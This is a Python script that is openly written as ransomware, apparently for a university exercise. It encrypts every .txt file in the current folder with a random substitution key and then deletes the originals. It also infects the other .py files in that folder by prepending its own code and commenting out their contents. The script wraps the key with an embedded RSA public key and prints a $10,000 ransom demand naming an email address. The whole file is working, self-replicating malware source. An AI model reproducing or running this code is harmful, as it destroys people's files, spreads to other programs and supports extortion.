#!/usr/bin/env python3

import string
import random
import os
import glob
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP 
import subprocess
from subprocess import Popen

# GENERATE RANDOM ALPHABET TABLE
# all letters (lower/upper)
alphabet = string.ascii_letters

# generate symmetric key
def generateKey(alphabet):
	alphabet = list(alphabet)
	random.shuffle(alphabet) # randomise
	return ''.join(alphabet) # convert to string

key = generateKey(alphabet)

################################

# LOCATES FILES TO BE ENCRYPTED
# stores a list of files to be encrypted
files = []

# search in the current working directory(cwd)
for file in glob.glob("*.txt"): # txt files
	files.append(file) # add file to files list

################################

# MAP SUBSTITUTION VALUES
# create a dictionary
dict = {}

# iterate through the alphabet list
for i, c in enumerate(alphabet):
	dict[c] = key[i]

################################

# ENCRYPT THE TEXT FILES
# go through all the files, read and encrypt
for file in files:
	with open(file, "r") as f:
		contents = f.read()
	# encrypt the contents
	for i, c in enumerate(contents):
		contents = list(contents)
		if contents[i] in dict: # if key value exists in dictionary
			contents[i] = dict[c]
	# write encrypted data to enc file
	fout = open(str(f.name.split('.')[0]) + ".enc", "w")
	fout.write(''.join(contents))
	fout.close()

################################

# delete the original text files
def delete_txt_files():
	for file in files:
		os.remove(file)

delete_txt_files()

################################

# REPLICATE AND COMMENT PYTHON FILE
# read this file
with open(sys.argv[0], "r") as fin:
	own_contents = fin.read()
	fin.close()

# list of victim's py files
victims_py_files = []

# locate the python file(s) to be infected
for file in glob.glob("*.py"):
	if file != "ransomware.py" and file != "file_recovery_program.py" and file != "key_recovery_program.py":
		victims_py_files.append(file)

for file in victims_py_files: # locate py file
	with open(file, "r") as fin:
		original = fin.readlines()
		# prepending # to comment out the line
		original = ["#" + line for line in original]
		fin.close()
	with open(file, "w") as fout:
		fout.write(own_contents)
		fout.writelines(original)
		fout.close()

################################

# ENCRYPT SYMKEY USING RSA
# generate rsa private and public key
pk = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAukDRNoHjOjPcD6Fq/vyJ
NVsxrGPQeJtIH9g3T359fNJjTDZDehiqy0UTjuA9g5/ETl1BC846MBZq9lVeZQhQ
2zc9yFC56+u9ne+JaNasSneURKG/EVH870V0OrqLICKWZPdob8GuPi0/4APwAKro
XTqPPL4hHbFaxe4DWT6pOzMl+s7GxDzKfi4z1vE8yZAYszkWFJhi7Bss2dM9vf5q
nCYZfpmAKpK5hztsgdhWhgRYOcKOpvGqku0wZyomsuQEqp+CueOw+Ui0P3G/ZYDK
M2usTRvSeDT83OPTMnCyt8Mwwp413UEgSVmjPPcS3UjgKG7jIWElSWYCjuUApmp5
sQIDAQAB
-----END PUBLIC KEY-----"""
public_key = RSA.import_key(pk)
cipher_rsa = PKCS1_OAEP.new(public_key)

# encrypt symkey
symkey = bytes(key, 'utf-8') # convert to bytes
enc_symkey = cipher_rsa.encrypt(symkey)

# write to file
fout = open("key.bin", "wb")
fout.write(enc_symkey)
fout.close()

################################

# Ransom message
print("Your text files are encrypted. To decrypt them, you need to pay me $10,000 and send key.bin in your folder to kqt960@uowmail.edu.au")

################################

# make the victim's py file(s) executable
for file in victims_py_files:
	p = Popen(["chmod", "+x", file])

################################
